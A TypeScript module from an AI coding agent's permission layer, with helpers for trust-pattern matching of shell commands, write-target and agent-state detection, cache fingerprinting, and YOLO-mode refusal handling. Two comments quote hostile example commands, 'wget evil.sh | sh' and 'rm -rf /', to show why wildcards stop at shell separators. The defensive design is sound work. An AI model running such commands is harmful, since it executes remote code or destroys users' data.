/**
 * Pure helpers for permission policy evaluation — trust-pattern matching,
 * tool fingerprinting, and sensitive-read detection.
 *
 * Extracted from permission-policy.ts. No class state. The only I/O is the
 * sync realpath probe in {@link isInsideAgentStateRoot} (symlinked-root
 * containment); everything else is pure string work.
 */
import * as path from 'node:path';
import type { PermissionDecision } from '@wrongstack/contracts/types/permission';
import type { Tool } from '@wrongstack/contracts/types/tool';
import { matchAny, matchAnyCommand } from '../utils/glob-match.js';
import { subjectForToolInput } from '../utils/tool-subject.js';
import {
  isAgentStateExtractionTarget,
  isAgentStateWriteTarget,
} from './agent-state-sensitivity.js';
import { hasCapability, ToolCapabilities } from './capabilities.js';
import {
  SENSITIVE_PATH_INPUT_KEYS,
  shellCommandLinesFromInput,
} from './permission-sensitive-read.js';
import { classifyDestructiveCommand, type DestructiveKind } from './yolo-risk.js';

export {
  inputPathLooksSensitive,
  isInsideAgentStateRoot,
  isProtectedAgentStatePath,
  isSensitiveReadCall,
  MAX_COMMAND_SCAN_DEPTH,
  MAX_COMMAND_SCAN_NODES,
  SENSITIVE_PATH_INPUT_KEYS,
  shellCommandLineFromInput,
  shellCommandLinesFromInput,
  shellCommandReadsSensitivePath,
} from './permission-sensitive-read.js';

/**
 * Match a computed subject against stored trust patterns.
 *
 * Exact string equality is checked FIRST, before glob compilation. Subjects are
 * glob-escaped at the source (`escapeGlobSubject` turns `* ? [ ]` into `\* \? \[
 * \]`), and a stored "always"-trust pattern is just a prior subject — so for an
 * identical command the pattern and the subject are byte-for-byte equal. The
 * glob matcher alone could not confirm that: `compileGlob` does not treat a
 * backslash as an escape outside character classes, so an escaped `\[`/`\]` is
 * parsed as a character-class delimiter and a command like `[ -f x ]` or
 * `grep "[0-9]"` never re-matched its own trust entry — re-prompting forever
 * even after the user chose "always" (#15). Exact equality is also strictly
 * tighter than a glob, so this never widens what a pattern authorizes; genuine
 * wildcard patterns (e.g. a user-authored `git *`) still fall through to glob.
 */
export function matchesTrust(patterns: string[], subject: string): boolean {
  return patterns.includes(subject) || matchAny(patterns, subject);
}

/**
 * Match a trust pattern against a shell command line, for ALLOW decisions only
 * (WS-047).
 *
 * `matchesTrust` compiles `*` to `[^/]*`, which crosses `;`, `&` and `|`. On a
 * path that is right; on a command it means a user who wrote `git *` also
 * authorized `git status; wget evil.sh | sh`. `matchAnyCommand` stops the
 * wildcard at shell separators, so the pattern authorizes what it appears to.
 *
 * DELIBERATELY NOT used for deny. This matcher is strictly narrower, and
 * narrowing a deny pattern un-blocks whatever falls outside it: a deny of
 * `git *` must keep matching `git status; rm -rf /`, because the user's intent
 * there is "no git-shaped command gets through", not "only well-formed ones".
 * Narrower is safer for allow and more dangerous for deny — hence two call
 * sites with two matchers rather than one shared helper that picks.
 *
 * Exact equality is kept first for the same reason as `matchesTrust`: a stored
 * "always" pattern is a prior subject, and glob-escaped brackets do not
 * round-trip through the compiler (#15).
 */
export function matchesCommandTrust(patterns: string[], subject: string): boolean {
  return patterns.includes(subject) || matchAnyCommand(patterns, subject);
}

/**
 * Input keys that may NAME a write destination.
 *
 * DERIVED from {@link SENSITIVE_PATH_INPUT_KEYS} rather than written out
 * again. The two lists are the read side and the write side of the same
 * question — "which fields of this input are paths?" — and they had already
 * drifted: the plural keys added for WS-2026-09-17-01 (`paths`, `file_paths`,
 * `filePaths`, `targets`, `targetPaths`) went into the sensitive-read list and
 * not into this one, so a mutating tool using a plural key would have had its
 * destinations invisible to the write gate.
 *
 * No such tool exists today (probe-verified 2026-09-22: every mutating tool
 * with a plural path input uses `files`, and most also declare `writeTargets`),
 * which is exactly why this was worth closing while it was still latent rather
 * than after a tool made it reachable.
 *
 * The extras below are write-only destinations with no read-gate meaning.
 */
const FS_WRITE_TARGET_INPUT_KEYS: readonly string[] = [
  ...SENSITIVE_PATH_INPUT_KEYS,
  'out',
  'directory',
  'cwd',
  'template',
];

export function fsWriteTargetPaths(tool: Tool | undefined, input: unknown): string[] {
  const out: string[] = [];
  if (typeof tool?.writeTargets === 'function') {
    try {
      for (const declared of tool.writeTargets(input)) {
        if (typeof declared === 'string' && declared.length > 0 && !out.includes(declared)) {
          out.push(declared);
        }
      }
    } catch {
      // A buggy tool hook must not crash permission evaluation — fall
      // through to the key-list heuristic.
    }
  }
  if (!input || typeof input !== 'object') return out;
  const obj = input as Record<string, unknown>;
  for (const key of FS_WRITE_TARGET_INPUT_KEYS) {
    const value = obj[key];
    if (typeof value === 'string') {
      if (value.length > 0) out.push(value);
    } else if (Array.isArray(value)) {
      for (const item of value) {
        if (typeof item === 'string' && item.length > 0) out.push(item);
      }
    }
  }
  return out;
}

/** Input keys naming a directory the tool writes beneath, not a single file. */
const FS_WRITE_DIRECTORY_INPUT_KEYS: readonly string[] = ['directory', 'cwd'];

/**
 * Does this call write agent-state under the wstack global root?
 *
 * The single judgment behind the locked `agent-state` kind for file tools, for
 * the leader's policy and the subagent policy alike. File targets go through
 * {@link isAgentStateWriteTarget}; a DIRECTORY input is judged like an archive
 * extraction, because the tool may write any name beneath it — `directory:
 * ~/.wrongstack/projects/abc` can reach that project's `config.local.json`.
 * Tool-declared targets can be relative to that directory (`patch`), so a
 * relative target is resolved against it as well as against `base`.
 */
export function writesAgentState(
  tool: Tool | undefined,
  input: unknown,
  base: string | undefined,
): boolean {
  const at = (p: string, from: string | undefined) =>
    from ? path.resolve(from, p) : path.resolve(p);
  const obj =
    input && typeof input === 'object' && !Array.isArray(input)
      ? (input as Record<string, unknown>)
      : {};
  const dirs = FS_WRITE_DIRECTORY_INPUT_KEYS.map((key) => obj[key])
    .filter((value): value is string => typeof value === 'string' && value.length > 0)
    .map((dir) => at(dir, base));
  if (dirs.some(isAgentStateExtractionTarget)) return true;
  for (const target of fsWriteTargetPaths(tool, input)) {
    if (isAgentStateWriteTarget(at(target, base))) return true;
    if (path.isAbsolute(target)) continue;
    if (dirs.some((dir) => isAgentStateWriteTarget(path.resolve(dir, target)))) return true;
  }
  return false;
}

/**
 * Display-quality write destinations for the confirmation prompt (VULN-001
 * Phase 2). Prefers the tool's own `writeTargets` declaration — the real
 * destinations, without innocuous `directory: "."` noise — and falls back to
 * the same key list the gate uses. Returns [] when nothing is known.
 */
export function describeWriteTargets(tool: Tool | undefined, input: unknown): string[] {
  if (typeof tool?.writeTargets === 'function') {
    try {
      const declared = tool
        .writeTargets(input)
        .filter((p): p is string => typeof p === 'string' && p.length > 0);
      if (declared.length > 0) return declared;
    } catch {
      // fall back to the heuristic below
    }
  }
  return fsWriteTargetPaths(undefined, input);
}

/**
 * True when this tool's permission subject is a shell command line rather than
 * a path, url, or name — i.e. when the stricter wildcard rules apply.
 */
export function hasShellSubject(tool: Tool): boolean {
  return (
    tool.name === 'bash' ||
    tool.name === 'shell' ||
    tool.name === 'exec' ||
    hasCapability(tool, [
      ToolCapabilities.SHELL_ARBITRARY,
      ToolCapabilities.SHELL_RESTRICTED,
      ToolCapabilities.SHELL_EXEC,
    ])
  );
}

/**
 * Reason a persistent "always allow" cannot be recorded for this call, or
 * `undefined` when it can (WS-046).
 *
 * A stored trust pattern is only ever consulted as
 * `entry.allow && subject && matchesTrust(entry.allow, subject)`. When the tool
 * produces no subject, that condition can never be true — so `trust()` with the
 * fallback `pattern: tool.name` writes an entry that is dead on arrival.
 *
 * The user experience of that bug is the damaging part. They pick "always
 * allow", are asked again on the very next identical call, conclude the feature
 * is broken, and reach for the one thing that does work: a blanket
 * `{"exec": {"auto": true}}`. A silent no-op does not just fail to help — it
 * actively trains people into the widest possible grant.
 *
 * So the option is refused with a stated reason instead of accepted and
 * discarded. Exported so a UI can hide the choice rather than offer one that
 * cannot be honoured.
 */
export function alwaysAllowUnavailableReason(tool: Tool, input: unknown): string | undefined {
  const subject = subjectForToolInput(tool.name, input, tool.subjectKey, tool.subjectFields);
  if (subject !== undefined) return undefined;
  return (
    `"always allow" needs a subject to remember, and ${tool.name} calls do not carry one ` +
    `(no subjectKey, and no path/url/name input). Recording it would store a rule that can ` +
    `never match. Approve this call, or set a trust rule for ${tool.name} explicitly.`
  );
}

/**
 * Fingerprint of the tool fields a permission decision actually depends on
 * (WS-058).
 *
 * The eval cache was keyed on tool NAME plus subject, so a cached verdict
 * outlived the tool definition it was computed from. `ToolRegistry.wrap()`
 * replaces a tool in place and is reachable from the plugin API, so a tool
 * tightened to `permission: 'deny'` mid-session would keep being served the
 * `auto` decided under its previous definition. The cache check also runs
 * BEFORE the tool-default-deny branch, so nothing downstream re-checked.
 *
 * Including these fields in the key means a redefined tool misses the cache
 * and is re-evaluated, rather than inheriting a verdict that no longer
 * describes it. Capabilities are included because the dangerous-capability
 * branches read them; they are short, sorted lists. The tuple is
 * JSON-serialized so separators inside a field value (e.g. a `,` or `|`
 * in a capability string) cannot collide with the delimiters between
 * fields.
 */
export function permissionFingerprint(tool: Tool): string {
  const caps = [...(tool.capabilities ?? [])].sort();
  return JSON.stringify([
    tool.permission ?? '',
    tool.riskTier ?? '',
    tool.mutating ? 'm' : '',
    // WS-058 class: a permission decision now also reads Tool.writeTargets
    // (via fsWriteTargetPaths), so a registry wrap() that adds or removes the
    // hook must invalidate cached verdicts.
    typeof tool.writeTargets === 'function' ? 'wt' : '',
    caps,
  ]);
}

/**
 * The `git …` command line the structured `git` tool runs for `input`, for the
 * destructive classifier. The tool is not a shell surface (it declares
 * `shell.restricted`), so YOLO never classified it — `{command:'push',
 * force:true}` and `{command:'checkout', files:['.']}` ran unprompted while the
 * same `git push --force` / `git checkout -- .` typed into bash is gated.
 * Mirrors the tool's argv for the commands that can destroy work (push,
 * checkout, worktree remove); the rest render as `git <command>`. Core cannot
 * import the tool, so this reads its documented input shape.
 */
export function gitToolCommandLine(input: unknown): string | undefined {
  if (!input || typeof input !== 'object') return undefined;
  const i = input as Record<string, unknown>;
  const command = typeof i['command'] === 'string' ? i['command'] : undefined;
  if (!command) return undefined;
  const arg = (value: string) => (/[\s'"]/.test(value) ? `'${value.replace(/'/g, '')}'` : value);
  const branch = typeof i['branch'] === 'string' && i['branch'] ? arg(i['branch']) : undefined;
  const rawFiles = i['files'];
  const files = (
    Array.isArray(rawFiles) ? rawFiles : typeof rawFiles === 'string' ? rawFiles.split(',') : []
  )
    .filter((f): f is string => typeof f === 'string' && f.trim().length > 0)
    .map((f) => arg(f.trim()));
  switch (command) {
    case 'push':
      return ['git push', i['force'] === true ? '--force' : '', branch ? `origin ${branch}` : '']
        .filter(Boolean)
        .join(' ');
    case 'checkout':
      if (files.length > 0) return `git checkout -- ${files.join(' ')}`;
      return branch ? `git checkout ${branch} --` : 'git checkout';
    case 'worktree':
      if (i['worktreeAction'] === 'remove') {
        const target = typeof i['worktreePath'] === 'string' ? arg(i['worktreePath']) : '';
        return ['git worktree remove', i['force'] === true ? '--force' : '', target]
          .filter(Boolean)
          .join(' ');
      }
      return 'git worktree';
    default:
      return files.length > 0 ? `git ${command} -- ${files.join(' ')}` : `git ${command}`;
  }
}

/**
 * The destructive kind of a shell-surface call: the first command line that
 * classifies. A walk that hit its bounds is `download-and-run` — the unread
 * part is a command whose damage cannot be known in advance.
 */
export function classifyShellSurfaceInput(
  input: unknown,
  projectRoot: string | undefined,
): DestructiveKind | undefined {
  const { lines, truncated } = shellCommandLinesFromInput(input);
  for (const line of lines) {
    const kind = classifyDestructiveCommand(line, projectRoot);
    if (kind !== undefined) return kind;
  }
  return truncated ? 'download-and-run' : undefined;
}

/**
 * What a refusal the user wrote becomes under each YOLO level.
 *
 * - off: it refuses, as it always has.
 * - YOLO: it ASKS. YOLO runs without interrupting, except that it stops on
 *   damage and on anything the user forbade — and stopping means asking, so
 *   the user decides this one call. The confirm carries the destructive tier,
 *   so a host that auto-answers prompts when YOLO turns on leaves it for the
 *   user, and the `yolo_user_rule` source, so only the user answers it
 *   (`userRuleAnswer`).
 * - YOLO+: it refuses. YOLO+ asks nothing at all; the user's own refusals are
 *   the one thing it does not run.
 *
 * The single rule behind `evaluate()` and `explain()` for session "no"
 * answers, trust-file deny patterns, `/permissions deny` rules, and deny lists
 * that could not be checked for a call.
 */
export function refusalUnderYolo(
  refusal: PermissionDecision,
  mode: { yolo: boolean; yoloPlus: boolean },
): PermissionDecision {
  if (!mode.yolo || mode.yoloPlus || refusal.permission !== 'deny') return refusal;
  return {
    permission: 'confirm',
    source: 'yolo_user_rule',
    riskTier: 'destructive',
    reason: `${refusal.reason ?? 'denied'} — YOLO asks instead of refusing`,
  };
}
